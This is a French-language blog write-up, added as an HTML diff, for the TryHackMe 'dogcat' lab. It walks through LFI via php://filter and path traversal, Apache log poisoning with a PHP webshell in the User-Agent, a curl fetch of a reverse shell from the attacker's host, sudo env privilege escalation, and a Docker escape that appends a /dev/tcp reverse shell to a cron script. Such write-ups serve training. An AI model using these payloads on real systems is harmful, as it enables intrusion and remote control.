@@ -1,0 +1,365 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+    <title>TryHackMe - dogcat - Medium :: 99makarov&#39;s blog</title>
+  
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="Writeup pour la room &#34;dogcat&#34;, une room medium sous linux" />
+<meta name="keywords" content="infosec writeups" />
+<meta name="robots" content="noodp" />
+<link rel="canonical" href="/posts/thm-dogcat/" />
+
+
+
+
+
+
+  
+  
+  
+  
+  
+  <link rel="stylesheet" href="/styles.css">
+
+
+
+
+
+
+
+  <link rel="shortcut icon" href="/img/theme-colors/blue.png">
+  <link rel="apple-touch-icon" href="/img/theme-colors/blue.png">
+
+
+
+<meta name="twitter:card" content="summary" />
+
+
+
+<meta property="og:locale" content="en" />
+<meta property="og:type" content="article" />
+<meta property="og:title" content="TryHackMe - dogcat - Medium">
+<meta property="og:description" content="Writeup pour la room &#34;dogcat&#34;, une room medium sous linux" />
+<meta property="og:url" content="/posts/thm-dogcat/" />
+<meta property="og:site_name" content="99makarov&#39;s blog" />
+
+  
+  
+  <meta property="og:image" content="/static/img/thm-dogcat/main.png">
+
+<meta property="og:image:width" content="1200">
+<meta property="og:image:height" content="627">
+
+
+  <meta property="article:published_time" content="2022-12-22 00:00:00 &#43;0000 UTC" />
+
+
+
+
+
+
+
+
+
+
+
+
+</head>
+<body class="blue">
+
+
+<div class="container center headings--one-size">
+
+  <header class="header">
+  <div class="header__inner">
+    <div class="header__logo">
+      <a href="/">
+  <div class="logo">
+    /home
+  </div>
+</a>
+
+    </div>
+    
+      <ul class="menu menu--mobile">
+  <li class="menu__trigger">Menu&nbsp;▾</li>
+  <li>
+    <ul class="menu__dropdown">
+      
+        
+          <li><a href="/about">/about</a></li>
+        
+      
+        
+          <li><a href="/posts-list">/posts-list</a></li>
+        
+      
+      
+    </ul>
+  </li>
+</ul>
+
+    
+    
+  </div>
+  
+    <nav class="navigation-menu">
+  <ul class="navigation-menu__inner menu--desktop">
+    
+      
+        
+          <li><a href="/about">/about</a></li>
+        
+      
+        
+          <li><a href="/posts-list">/posts-list</a></li>
+        
+      
+      
+    
+  </ul>
+</nav>
+
+  
+</header>
+
+
+  <div class="content">
+    
+<article class="post">
+  <h1 class="post-title">
+    <a href="/posts/thm-dogcat/">TryHackMe - dogcat - Medium</a>
+  </h1>
+  <div class="post-meta">
+    
+      <time class="post-date">
+        2022-12-22 ::
+        
+      </time>
+    
+    
+      <span class="post-author">99makarov</span>
+    
+    
+  </div>
+
+  
+  
+  <img src="/static/img/thm-dogcat/main.png"
+    class="post-cover"
+    alt="TryHackMe - dogcat - Medium"
+    title="Cover Image" />
+
+
+  
+
+  <div class="post-content"><div>
+        <h1 id="dogcatthm">dogcat.thm<a href="#dogcatthm" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<ul>
+<li>Difficulty: Medium</li>
+<li>OS: Linux</li>
+<li>Description: <code>I made a website where you can look at pictures of dogs and/or cats! Exploit a PHP application via LFI and break out of a docker container.</code></li>
+<li>Link: <a href="https://tryhackme.com/room/dogcat">https://tryhackme.com/room/dogcat</a></li>
+</ul>
+<h1 id="note">Note<a href="#note" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<p>La room est pas mal, la partie privesc est beaucoup plus facile que le foothold qui m’a bien fait galérer puisque je faisais n’importe quoi, et à l’inverse pour la docker escape, on doit vraiment chercher pour trouver le script backup.sh…</p>
+<h1 id="recon">Recon<a href="#recon" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<p>On lance:</p>
+<p><code>⌨️ nmap -A dogcat.thm</code></p>
+<p><img src="https://user-images.githubusercontent.com/77807503/207948122-aec6bdc1-cb0c-4fbe-b137-bee1a341243d.png" alt="2022-12-15-183118_828x228_scrot"></p>
+<p>Rien de vraiment intéressant ici</p>
+<p><code>⌨️ dirb http://dogcat.thm</code></p>
+<p><img src="https://user-images.githubusercontent.com/77807503/207948161-c276e45d-453c-468a-bafd-3cf287db8aad.png" alt="2022-12-15-184415_930x1026_scrot"></p>
+<p>eeeeeeet, rien de vraiment intéressant ici non pus</p>
+<h1 id="foothold">Foothold<a href="#foothold" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<p>On va donc se concentrer sur le site en lui même:</p>
+<p><img src="https://user-images.githubusercontent.com/77807503/207948180-ba53a656-3fb1-4d6d-91ab-9934d7928771.png" alt="2022-12-15-182558_400x276_scrot"></p>
+<p>Deux boutons, si on clique sur le bouton <strong><strong><strong>cat</strong></strong></strong> par exemple, on est redirigé vers <strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong>dogcat.thm/?view=cat</strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></p>
+<p>On voit la LFI venir de loin, on tente donc de modifier le paramètre view pour y mettre cat.php</p>
+<p><img src="https://user-images.githubusercontent.com/77807503/207948207-65d07392-fab7-45fc-8704-faf35f70668a.png" alt="2022-12-15-183301_914x454_scrot"></p>
+<p>Ceci crée une erreur mais nous confirme que le site est bien vulnérable à une LFI sur ce paramètre</p>
+<p>Cela nous indique aussi qu’il ajoute l’extention .php à la fin du paramètre, ce qui ne nous arrange pas</p>
+<p>Puisqu’on ne peut lire que des fichiers PHP (à cause de l’extention), on peut tenter de lire l’index:</p>
+<p><code>⌨️ ?view=php://filter/convert.base64-encode/resource=cat/../index</code></p>
+<p>On utilise le filtre base64 pour lire le fichier index.php (on ne précise pas le .php puisque le backend va le rajouter tout seul)</p>
+<p><img src="https://user-images.githubusercontent.com/77807503/207948338-68202432-02af-4e33-93e0-80daeaadfb78.png" alt="2022-12-15-183822_1035x369_scrot"></p>
+<p>Et le site nous retourne bel et bien le code de l’index en base64</p>
+<p>En le décodant, on a ceci:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;!</span><span style="color:#a6e22e">DOCTYPE</span> <span style="color:#a6e22e">HTML</span><span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;</span><span style="color:#a6e22e">html</span><span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;</span><span style="color:#a6e22e">head</span><span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;</span><span style="color:#a6e22e">title</span><span style="color:#f92672">&gt;</span><span style="color:#a6e22e">dogcat</span><span style="color:#f92672">&lt;/</span><span style="color:#a6e22e">title</span><span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;</span><span style="color:#a6e22e">link</span> <span style="color:#a6e22e">rel</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;stylesheet&#34;</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;text/css&#34;</span> <span style="color:#a6e22e">href</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/style.css&#34;</span><span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;/</span><span style="color:#a6e22e">head</span><span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;</span><span style="color:#a6e22e">body</span><span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;</span><span style="color:#a6e22e">h1</span><span style="color:#f92672">&gt;</span><span style="color:#a6e22e">dogcat</span><span style="color:#f92672">&lt;/</span><span style="color:#a6e22e">h1</span><span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;</span><span style="color:#a6e22e">i</span><span style="color:#f92672">&gt;</span><span style="color:#a6e22e">a</span> <span style="color:#a6e22e">gallery</span> <span style="color:#a6e22e">of</span> <span style="color:#a6e22e">various</span> <span style="color:#a6e22e">dogs</span> <span style="color:#66d9ef">or</span> <span style="color:#a6e22e">cats</span><span style="color:#f92672">&lt;/</span><span style="color:#a6e22e">i</span><span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;</span><span style="color:#a6e22e">div</span><span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&lt;</span><span style="color:#a6e22e">h2</span><span style="color:#f92672">&gt;</span><span style="color:#a6e22e">What</span> <span style="color:#a6e22e">would</span> <span style="color:#a6e22e">you</span> <span style="color:#a6e22e">like</span> <span style="color:#a6e22e">to</span> <span style="color:#a6e22e">see</span><span style="color:#f92672">?&lt;/</span><span style="color:#a6e22e">h2</span><span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&lt;</span><span style="color:#a6e22e">a</span> <span style="color:#a6e22e">href</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/?view=dog&#34;</span><span style="color:#f92672">&gt;&lt;</span><span style="color:#a6e22e">button</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;dog&#34;</span><span style="color:#f92672">&gt;</span><span style="color:#a6e22e">A</span> <span style="color:#a6e22e">dog</span><span style="color:#f92672">&lt;/</span><span style="color:#a6e22e">button</span><span style="color:#f92672">&gt;&lt;/</span><span style="color:#a6e22e">a</span><span style="color:#f92672">&gt;</span> <span style="color:#f92672">&lt;</span><span style="color:#a6e22e">a</span> <span style="color:#a6e22e">href</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/?view=cat&#34;</span><span style="color:#f92672">&gt;&lt;</span><span style="color:#a6e22e">button</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;cat&#34;</span><span style="color:#f92672">&gt;</span><span style="color:#a6e22e">A</span> <span style="color:#a6e22e">cat</span><span style="color:#f92672">&lt;/</span><span style="color:#a6e22e">button</span><span style="color:#f92672">&gt;&lt;/</span><span style="color:#a6e22e">a</span><span style="color:#f92672">&gt;&lt;</span><span style="color:#a6e22e">br</span><span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">containsStr</span>($str, $substr) {
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">strpos</span>($str, $substr) <span style="color:#f92672">!==</span> <span style="color:#66d9ef">false</span>;
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>	    $ext <span style="color:#f92672">=</span> <span style="color:#a6e22e">isset</span>($_GET[<span style="color:#e6db74">&#34;ext&#34;</span>]) <span style="color:#f92672">?</span> $_GET[<span style="color:#e6db74">&#34;ext&#34;</span>] <span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;.php&#39;</span>;
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">isset</span>($_GET[<span style="color:#e6db74">&#39;view&#39;</span>])) {
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">containsStr</span>($_GET[<span style="color:#e6db74">&#39;view&#39;</span>], <span style="color:#e6db74">&#39;dog&#39;</span>) <span style="color:#f92672">||</span> <span style="color:#a6e22e">containsStr</span>($_GET[<span style="color:#e6db74">&#39;view&#39;</span>], <span style="color:#e6db74">&#39;cat&#39;</span>)) {
+</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#39;Here you go!&#39;</span>;
+</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">include</span> $_GET[<span style="color:#e6db74">&#39;view&#39;</span>] <span style="color:#f92672">.</span> $ext;
+</span></span><span style="display:flex;"><span>                } <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#39;Sorry, only dogs or cats are allowed.&#39;</span>;
+</span></span><span style="display:flex;"><span>                }
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    &lt;/div&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">&lt;/body&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">&lt;/html&gt;
+</span></span></span></code></pre></div><p>Et on peut voir quelque chose de très intéressant:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span>$ext <span style="color:#f92672">=</span> <span style="color:#a6e22e">isset</span>($_GET[<span style="color:#e6db74">&#34;ext&#34;</span>]) <span style="color:#f92672">?</span> $_GET[<span style="color:#e6db74">&#34;ext&#34;</span>] <span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;.php&#39;</span>;
+</span></span></code></pre></div><p>Cette condition est la cause de l’ajout du <strong><strong><strong><strong>.php</strong></strong></strong></strong> à la fin du nom du fichier</p>
+<p>En mettent un paramètre GET <strong><strong><strong>ext</strong></strong></strong>, on peut l’empêcher de faire ceci</p>
+<p>On peux donc craft un nouveau payload</p>
+<p><code>⌨️ ?view=cat/../../../../../../../../etc/passwd&amp;ext=</code></p>
+<p>En faisant ça, on va lire le /etc/passwd et puisque le paramètre <strong><strong><strong>ext</strong></strong></strong> existe, mais qu’il est vide, le site n’ajoutera pas d’extention au fichier</p>
+<p>Maintenant qu’on a un arbitrary file read, il faut le transformer en RCE</p>
+<p>La première méthode qu’on peut tester est le log poisonning</p>
+<p>Cela consiste à injecter du code php d’une manière ou d’une autre dans les logs du serveur, puis de lire les logs via notre LFI pour que le code qu’on y a injecté soit éxecuté</p>
+<p>On jète un coup d’oeil rapide à la requête et on voit que le site utilise apache puisqu’il y a <strong>Server Apache/2.4.38 (Debian)</strong> dans les headers</p>
+<p>On va donc lire les logs:</p>
+<p><code>⌨️ ?view=cat/../../../../../../../../var/log/apache2/access.log&amp;ext=</code></p>
+<p><img src="https://user-images.githubusercontent.com/77807503/207948498-5044cd35-79b1-45ed-8cca-304209026729.png" alt="2022-12-15-184704_928x560_scrot"></p>
+<p>Et c’est parfait, on voit que le site log non seulement notre IP, mais aussi notre User-Agent</p>
+<p><img src="https://user-images.githubusercontent.com/77807503/207948524-44806d26-73a4-4dd7-924d-a272da5909e9.png" alt="2022-12-15-185117_828x82_scrot"></p>
+<p>En mettant <strong><strong><strong><strong><strong><strong>du PHP</strong></strong></strong></strong></strong></strong> dans notre <strong><strong><strong><strong><strong><strong><strong><strong><strong><strong>User-Agent</strong></strong></strong></strong></strong></strong></strong></strong></strong></strong>, on devrait donc avoir une RCE</p>
+<p>On va tester avec cet <strong><strong>UA</strong></strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span> <span style="color:#a6e22e">system</span>(<span style="color:#e6db74">&#34;ls&#34;</span>) <span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
+</span></span></span></code></pre></div><p><img src="https://user-images.githubusercontent.com/77807503/207948542-c6c2ded3-072e-41ac-aa29-a699e0a273fd.png" alt="2022-12-15-185257_885x388_scrot"></p>
+<p>eeeet… j’ai cassé les logs</p>
+<p>Puisque j’ai fait une erreur dans mon PHP (j’ai oublié le ; à la fin), j’ai cassé le fichier logs et il est maintenant illisible à tout jamais 🥲</p>
+<p>Ma seule option est donc de redémarrer la box, et de réessayer</p>
+<p>Cette fois, je tente avec cet <strong><strong><strong>UA</strong></strong></strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span> <span style="color:#a6e22e">system</span>(<span style="color:#e6db74">&#39;ls&#39;</span>); <span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
+</span></span></span></code></pre></div><p><img src="https://user-images.githubusercontent.com/77807503/207948594-d712c15b-32ff-488e-80ad-03ce6875d294.png" alt="2022-12-15-185855_952x513_scrot"></p>
+<p>Ca fonctionne, on peut voir qu’il a bien éxécuté le <strong><strong><strong>PHP</strong></strong></strong></p>
+<p>Après avoir testé beaucoup de chose et avoir bien galéré, je passe sur un système un peu plus “<strong><strong><strong><strong><strong><strong><strong><strong><strong><strong>webshell</strong></strong></strong></strong></strong></strong></strong></strong></strong></strong>”, je modifie mon <strong><strong><strong><strong><strong><strong><strong><strong><strong><strong>user-agent</strong></strong></strong></strong></strong></strong></strong></strong></strong></strong> en:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span> <span style="color:#a6e22e">system</span>($_GET[<span style="color:#e6db74">&#34;cmd&#34;</span>]);<span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
+</span></span></span></code></pre></div><p>Je peux donc éxecuter du php avec un paramètre de ma requête maintenant</p>
+<p>Aucun des reverse shell exec que j’ai essayé n’a fonctionné, je vais donc get un fichier php depuis ma machine, puis le lire</p>
+<p>Je crée un <strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong>reverse.php</strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong> sur ma machine, et je lance un serveur python dans le même dossier</p>
+<p>Notre payload ressemble donc à</p>
+<p><code>⌨️ ?view=cat/../../../../../../../../var/log/apache2/access.log&amp;ext=&amp;cmd=curl 10.xx.xx.xx/reverse.php -o reverse.php</code></p>
+<p><img src="https://user-images.githubusercontent.com/77807503/207948634-8f3eece0-f064-46c7-aa4b-20ee39ef627a.png" alt="2022-12-15-192041_768x670_scrot"></p>
+<p>Je reçois plein de requêtes mais c’est normal puisqu’en faisant ça on crée aussi une boucle infinie</p>
+<p>Ce n’est pas un problème puisque le site va quand même get notre reverse shell, on n’a plus qu’à lancer un netcat, et se rendre sur <strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong>/reverse.php</strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></p>
+<p><code>⌨️ nc -lvnp 9001</code></p>
+<p><img src="https://user-images.githubusercontent.com/77807503/207948655-12505c8c-8497-4db2-bd8e-247785b28fa5.png" alt="2022-12-15-192700_984x239_scrot"></p>
+<p>On se balade un peu pour trouver les flags, a priori il y en a deux</p>
+<p><img src="https://user-images.githubusercontent.com/77807503/207948686-1515ba08-c982-45b9-8486-7d07670293f7.png" alt="2022-12-15-192813_501x581_scrot"></p>
+<p>(j’ai trouvé le 2ème avant le premier mais pas grave)</p>
+<p><code>THM{LF1_[...]_aec3fb}</code></p>
+<p><code>THM{Th1s_1s_[...]_ab67edfa}</code></p>
+<h1 id="privesc-inside-docker">Privesc (inside docker)<a href="#privesc-inside-docker" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<p><code>⌨️ sudo -l</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#a6e22e">Matching</span> <span style="color:#a6e22e">Defaults</span> <span style="color:#a6e22e">entries</span> <span style="color:#66d9ef">for</span> <span style="color:#a6e22e">www</span><span style="color:#f92672">-</span><span style="color:#a6e22e">data</span> <span style="color:#a6e22e">on</span> <span style="color:#ae81ff">3732</span><span style="color:#a6e22e">cff32a70</span><span style="color:#f92672">:</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">env_reset</span>, <span style="color:#a6e22e">mail_badpass</span>, <span style="color:#a6e22e">secure_path</span><span style="color:#f92672">=/</span><span style="color:#a6e22e">usr</span><span style="color:#f92672">/</span><span style="color:#a6e22e">local</span><span style="color:#f92672">/</span><span style="color:#a6e22e">sbin\</span><span style="color:#f92672">:/</span><span style="color:#a6e22e">usr</span><span style="color:#f92672">/</span><span style="color:#a6e22e">local</span><span style="color:#f92672">/</span><span style="color:#a6e22e">bin\</span><span style="color:#f92672">:/</span><span style="color:#a6e22e">usr</span><span style="color:#f92672">/</span><span style="color:#a6e22e">sbin\</span><span style="color:#f92672">:/</span><span style="color:#a6e22e">usr</span><span style="color:#f92672">/</span><span style="color:#a6e22e">bin\</span><span style="color:#f92672">:/</span><span style="color:#a6e22e">sbin\</span><span style="color:#f92672">:/</span><span style="color:#a6e22e">bin</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">User</span> <span style="color:#a6e22e">www</span><span style="color:#f92672">-</span><span style="color:#a6e22e">data</span> <span style="color:#a6e22e">may</span> <span style="color:#a6e22e">run</span> <span style="color:#a6e22e">the</span> <span style="color:#a6e22e">following</span> <span style="color:#a6e22e">commands</span> <span style="color:#a6e22e">on</span> <span style="color:#ae81ff">3732</span><span style="color:#a6e22e">cff32a70</span><span style="color:#f92672">:</span>
+</span></span><span style="display:flex;"><span>    (<span style="color:#a6e22e">root</span>) <span style="color:#a6e22e">NOPASSWD</span><span style="color:#f92672">:</span> <span style="color:#f92672">/</span><span style="color:#a6e22e">usr</span><span style="color:#f92672">/</span><span style="color:#a6e22e">bin</span><span style="color:#f92672">/</span><span style="color:#a6e22e">env</span>
+</span></span></code></pre></div><p>On a la perm <strong><strong><strong><strong>sudo</strong></strong></strong></strong> sur <strong><strong><strong>/usr/bin/env</strong></strong></strong></p>
+<p>→ <a href="https://gtfobins.github.io/gtfobins/env/#sudo">GTFObins</a></p>
+<p><code>⌨️ sudo env /bin/sh</code></p>
+<p>On cat le 3e flag</p>
+<p><img src="https://user-images.githubusercontent.com/77807503/207948716-22e25421-2d17-49b4-b74a-4cdce14c9028.png" alt="2022-12-15-193011_1073x443_scrot"></p>
+<p><code>THM{D1ff3r3nt_[...]_874112}</code></p>
+<p>sauf qu’il y en a 4… 🥲</p>
+<h1 id="docker-escape">Docker escape<a href="#docker-escape" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<p>En regardant attentivement le résultat du <strong><strong><strong><strong><strong><strong><strong>sudo -l</strong></strong></strong></strong></strong></strong></strong>, on voit ceci:</p>
+<blockquote>
+<p>User www-data may run the following commands on 3732cff32a70</p>
+</blockquote>
+<p>Le nom de l’host indique qu’on est dans un docker</p>
+<p>En se balandant sur la machine, on trouve <strong><strong><strong><strong><strong><strong><strong><strong><strong>backup.sh</strong></strong></strong></strong></strong></strong></strong></strong></strong> dans <strong><strong><strong><strong><strong>/opt/</strong></strong></strong></strong></strong></p>
+<p>Un script de <strong><strong><strong><strong><strong><strong>backup</strong></strong></strong></strong></strong></strong> dans un <strong><strong><strong><strong><strong><strong>docker</strong></strong></strong></strong></strong></strong>, généralement, y’a un cron derrière qui le run toutes les X secondes</p>
+<p>Et puisqu’on est root, on peut tout bêtement ajouter ce qu’on veut dedans</p>
+<p>Donc on ajoute un payload de reverse shell et on lance un netcat sur notre machine</p>
+<p><code>⌨️ echo &quot;bash -i &gt;&amp; /dev/tcp/10.8.47.144/1338 0&gt;&amp;1&quot; &gt;&gt; backup.sh</code></p>
+<p>J’ai même pas le temps de prendre un screen que le netcat reçoit la connection</p>
+<p>On est maintenant root sur la machine principale, et on peut récupérer le dernier flag</p>
+<p><img src="https://user-images.githubusercontent.com/77807503/207948760-81200cc9-4369-4bf5-bfb1-b159424ffb6c.png" alt="2022-12-15-193605_1920x1080_scrot"></p>
+<p><code>⌨️ cat flag4.txt</code></p>
+<p><code>THM{esc4l4tions_on_[...]_7a52b17dba6ebb0dc38bc1049bcba02d}</code></p>
+<p>gg!</p>
+
+      </div></div>
+
+  
+    
+<div class="pagination">
+    <div class="pagination__title">
+        <span class="pagination__title-h">Voir d&#39;autres posts</span>
+        <hr />
+    </div>
+    <div class="pagination__buttons">
+        
+        <span class="button previous">
+            <a href="/posts/nahamcon2022/">
+                <span class="button__icon">←</span>
+                <span class="button__text">NahamCon CTF 2022 - Writeup</span>
+            </a>
+        </span>
+        
+        
+        <span class="button next">
+            <a href="/posts/thm-madeyes/">
+                <span class="button__text">TryHackMe - Madeye&#39;s Castle - Medium</span>
+                <span class="button__icon">→</span>
+            </a>
+        </span>
+        
+    </div>
+</div>
+
+  
+
+  
+    
+
+  
+</article>
+
+  </div>
+
+  
+    <footer class="footer">
+  <div class="footer__inner">
+    
+      <div class="copyright copyright--user">
+        <span>/home/rami_malek</span>
+    
+        <span>:: Theme made by <a href="https://twitter.com/panr">panr</a></span>
+      </div>
+  </div>
+</footer>
+
+
+
+
+
+
+<script type="text/javascript" src="/bundle.min.js"></script>
+
+
+
+
+
+  
+</div>
+
+</body>
+</html>
